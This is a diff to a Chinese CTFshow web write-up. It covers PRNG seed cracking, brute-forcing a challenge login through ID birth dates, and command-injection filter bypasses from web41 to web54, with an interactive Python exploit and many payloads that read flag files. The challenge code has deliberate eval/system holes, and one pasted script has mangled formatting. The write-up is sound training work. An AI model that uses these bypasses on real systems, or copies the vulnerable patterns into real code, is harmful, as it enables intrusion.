@@ -1,6 +1,6 @@
-## **CTFshow**
+# **CTFshow_Web**
 
-### **信息收集**：
+### **信息收集**：（完工）
 
 #### Web 1-5
 
@@ -227,7 +227,7 @@ Flappy_js.js
 
 ![image-20241113134305246](assets/image-20241113134305246.png)
 
-### 爆破：
+### 爆破：（完工）
 
 #### web21
 
@@ -401,6 +401,246 @@ echo intval(mt_rand());
 ```
 
 不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag
+
+#### web25
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-03 13:56:57
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-03 15:47:33
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+error_reporting(0);
+include("flag.php");
+if(isset($_GET['r'])){
+    $r = $_GET['r'];
+    mt_srand(hexdec(substr(md5($flag), 0,8)));
+    $rand = intval($r)-intval(mt_rand());
+    if((!$rand)){
+        if($_COOKIE['token']==(mt_rand()+mt_rand())){
+            echo $flag;
+        }
+    }else{
+        echo $rand;
+    }
+}else{
+    highlight_file(__FILE__);
+    echo system('cat /proc/version');
+}
+```
+
+继续php伪随机数
+
+我们需要知道一个性质
+
+当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下
+
+```php
+<?php
+
+mt_srand(1852100618);
+
+echo mt_rand();
+echo mt_rand();
+echo mt_rand();
+echo mt_rand();
+
+'''
+1640856123
+1390302953
+893879251
+859994814
+```
+
+在这道题里面我们需要得到前三个随机数
+
+第一个随机数我们可以使r=0得到，第一个随机数为1640856123
+
+![image-20241124162638637](assets/image-20241124162638637.png)
+
+得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数
+
+php脚本(极其慢)
+
+```php
+<?php
+$a= 390148868;//第一个随机数
+$b= 0 ;
+while (true){
+    mt_srand($b);
+    if(mt_rand()==$a){
+        echo "success:"+$b;
+        break;
+    }
+    echo $b;
+    echo "\n";
+    $b+=1;
+
+}
+```
+
+或者使用php_mt_seed-4.0工具
+
+![image-20241124163359970](assets/image-20241124163359970.png)
+
+我们可以看到不同版本的seed是不同的，我们一个个试试就行了
+
+```php
+mt_srand(1852100618);
+echo mt_rand();// 第一次随机数（不能少）
+echo "\ntoken：";
+echo (mt_rand()+mt_rand()); //第二和第三次随机数相加，也就是我们要对token
+```
+
+得到token的值，我们只需要使rand为零即可得到flag
+
+也就是说我们只需要使r等于第一次随机数即可
+
+传参，得到flag
+
+![image-20241124163754599](assets/image-20241124163754599.png)
+
+#### web26
+
+![image-20241124173300016](assets/image-20241124173300016.png)
+
+这么多我咋爆，赌一把只爆密码
+
+![image-20241124173340723](assets/image-20241124173340723.png)
+
+#### web27
+
+![image-20241124201909506](assets/image-20241124201909506.png)
+
+这题是一个教务系统，需要通过账号密码登录
+
+先信息收集一下
+
+我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统
+
+![image-20241124202141536](assets/image-20241124202141536.png)
+
+![image-20241124202155511](assets/image-20241124202155511.png)
+
+分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？
+
+bp抓个包
+
+![image-20241124203316274](assets/image-20241124203316274.png)
+
+哎我草，我数据呢
+
+forward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）
+
+![image-20241124203440000](assets/image-20241124203440000.png)
+
+我们可以发现其实身份证缺失的部分刚好是出生日期
+
+那我们可以用bp中的日期爆破功能
+
+![image-20241124205446714](assets/image-20241124205446714.png)
+
+![image-20241124211229000](assets/image-20241124211229000.png)
+
+爆出来的msg用unicode解码一下就能得到账号密码了
+
+![image-20241124211334906](assets/image-20241124211334906.png)
+
+贴个大佬的脚本
+
+```python
+url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php' NUM=32
+
+def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U))
+
+class TaskRuner: def init(self,n) -> None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass
+
+import aiohttp from urllib.parse import quote from datetime import date, timedelta
+
+class NYR: def init(self,start_date,end_date) -> None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t>self.end_date: return None self.current_date+=self.delta return t
+
+class Scanner(TaskRuner): def init(self,d1,d2,n) -> None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True
+
+async def task_function(self, n):
+    while self.alive:
+        u=self.nyr.next()
+        if not u:
+            break
+        r=await self.login(u)
+        if r:
+            self.alive=False
+async def login(self,t:date):
+    url='https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php'
+    n=t.year
+    y=t.month
+    r=t.day
+    n=str(n)
+    y=str(y)
+    r=str(r)
+    if len(y)==1:
+        y='0'+y
+    if len(r)==1:
+        r='0'+r
+    sfz='621022'+n+y+r+'5237'
+    data={
+        'a':'高先伊',
+        'p':sfz,
+    }
+    sess=aiohttp.ClientSession()
+    try:
+        r=await sess.post(url=url,data=data,ssl=False)
+        text=await r.text()
+        js=loads(text)
+        msg=js['msg']
+        print(sfz,msg)
+        await sess.close()
+        return msg!='提交信息有误'
+    except Exception as e:
+        print(e)
+        pass
+    try:
+        await sess.close()
+    except:
+        pass
+    return False
+
+async def handle_up(self,u,p):
+    pass
+a=Scanner(date(1990,1,1),date(2010,12,12),NUM)
+
+a.run()
+```
+
+
+
+#### web28
+
+![image-20241124212238261](assets/image-20241124212238261.png)
+
+这题本来不知道要干嘛
+
+![image-20241124212302234](assets/image-20241124212302234.png)
+
+dirsearch扫一下,感觉应该是目录爆破
+
+![image-20241124213646757](assets/image-20241124213646757.png)
+
+先爆破一下0-100
+
+![image-20241124220027195](assets/image-20241124220027195.png)
+
+
+
+
 
 ### **命令执行**：
 
@@ -892,6 +1132,682 @@ payload：
 关于无参命令执行的一些解释
 
 ![image-20241109165447576](assets/202411091654772.png)
+
+#### web41
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 羽
+# @Date:   2020-09-05 20:31:22
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:40:07
+# @email: 1341963450@qq.com
+# @link: https://ctf.show
+
+*/
+
+if(isset($_POST['c'])){
+    $c = $_POST['c'];
+if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
+        eval("echo($c);");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+过滤内容：`/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i`
+
+这个题过滤了`$、+、-、^、~`使得**异或自增和取反**构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或[运算符](https://so.csdn.net/so/search?q=运算符&spm=1001.2101.3001.7020)`|`。
+我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。
+
+大佬的脚本
+
+```php
+<?php
+$myfile = fopen("rce_or.txt", "w");
+$contents="";
+for ($i=0; $i < 256; $i++) { 
+	for ($j=0; $j <256 ; $j++) { 
+
+		if($i<16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j<16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
+    }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)|urldecode($b));
+		if (ord($c)>=32&ord($c)<=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+
+```
+
+```python
+# -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
+if(len(argv)!=2):
+   print("="*50)
+   print('USER：python exp.py <url>')
+   print("eg：  python exp.py http://ctf.show/")
+   print("="*50)
+   exit(0)
+url=argv[1]
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("rce_or.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"|\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
+   data={
+       'c':urllib.parse.unquote(param)
+       }
+   r=requests.post(url,data=data)
+   print("\n[*] result:\n"+r.text)
+
+```
+
+将两个文件放在同一个文件夹，运行exp.py即可
+
+羽师傅nb
+
+![image-20241124223329525](assets/image-20241124223329525.png)
+
+> 注意链接要用http不能用https
+
+#### web42
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 20:51:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    system($c." >/dev/null 2>&1");
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这道题会将我们输入的命令与`" >/dev/null 2>&1"`进行拼接
+
+> /dev/null 2>&1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显
+
+导致我们无法成功执行
+
+我们可以通过`%0a`截断的方式绕过
+
+> tac fl*%0a
+
+or
+
+> ; //分号
+> | //只执行后面那条命令
+> || //只执行前面那条命令
+> & //两条命令都会执行
+> && //两条命令都会执行
+>
+> 过滤了分号和cat，可以用||和&来代替分号，tac代替cat
+>
+> 可构造playload:
+> url/?c=tac flag.php||
+> url/?c=tac flag.php%26
+> 注意，这里的&需要url编码
+
+#### web43
+
+过滤了cat、；，
+
+不是很影响
+
+```
+tac fl*%0a
+
+or
+
+tac flag.php||
+
+...
+//记得转url编码
+```
+
+#### web44
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:01
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/;|cat|flag/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了`;|cat|flag`
+
+小问题
+
+```
+tac fl*%0a
+
+or
+
+tac f*||
+
+...
+//记得转url编码
+```
+
+#### web45
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:35:34
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| /i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了`;|cat|flag`和空格
+
+可以用%09或$IFS$9代替空格
+
+```
+tac%09fl*%0a
+
+or
+
+tac%09f*||
+
+or
+
+echo$IFS`tac$IFS*`%0A
+
+...
+//记得转url编码
+```
+
+#### web46
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:50:19
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+ 过滤有点多啊
+
+> \;|cat|flag| |[0-9]|\\$|\*
+
+但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤
+
+```
+tac%09fl*%0a
+
+or
+
+tac%09f*||
+
+or
+
+tac<f*||
+
+//记得转url编码
+```
+
+#### web47
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:59:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤这么多O.o？
+
+> \;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail
+
+但是幸好我用的是tac
+
+```
+tac%09fl*%0a
+
+or
+
+tac%09f*||
+
+or
+
+tac<f*||
+
+//记得转url编码
+```
+
+#### web48
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:06:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤更多了
+
+> \;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`
+
+```
+tac%09fl??.php%0a
+
+or
+
+tac%09fl??.php%7c%7c 
+//记得转url编码
+```
+
+
+
+
+
+#### web49
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:22:43
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+> \;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%
+
+虽然过滤了%但是是不影响我们传入的url编码的
+
+```
+tac%09fl??.php%0a
+
+or
+
+tac%09fl??.php%7c%7c 
+```
+
+
+
+#### web50
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:32:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+> \;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26
+
+坏，没法用%09代替空格，没法用?代替字符
+
+不过幸好还有<和''
+
+```
+tac<fla%27%27g.php||
+or
+tac<fla%27%27g.php%0a
+```
+
+#### web51
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:42:52
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+> \;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/
+
+怎么把我tac也过滤了
+
+没事能绕过
+
+```
+t%27%27ac<fla%27%27g.php||
+or
+t%27%27ac<fla%27%27g.php%0a
+```
+
+#### web51
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:50:30
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+> \;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\<
+
+我测怎么连< >都要过滤
+
+别忘了还可以用$IFS
+
+```
+ca%27%27t$IFS/fla%27%27g||
+or
+ca%27%27t$IFS/fla%27%27g%0a
+```
+
+#### web52
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 18:21:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        echo($c);
+        $d = system($c);
+        echo "<br>".$d;
+    }else{
+        echo 'no';
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+> \;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</
+
+这题没有在后面进行命令拼接，其他和上一题一样
+
+```
+c%27%27at${IFS}fla%27%27g.php
+```
+
+#### web54
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:43:42
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过
+
+这题没过率通配符?
+
+解一
+
+```
+/bin/?at${IFS}f???????
+```
+
+cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。
+
+bin下的命令：[Linux /bin 目录下命令简要说明 - 崔旗 - 博客园](https://www.cnblogs.com/cuiqi1314/articles/7339776.html)
+
+同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。
+解二
+
+```
+vi${IFS}fla?.php 
+or
+c=uniq${IFS}f???.php //倒序的
+```
+
+
 
 ### **文件包含**
 
@@ -1410,6 +2326,8 @@ poc
 ```
 ?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
 ```
+
+
 
 ### 反序列化
 
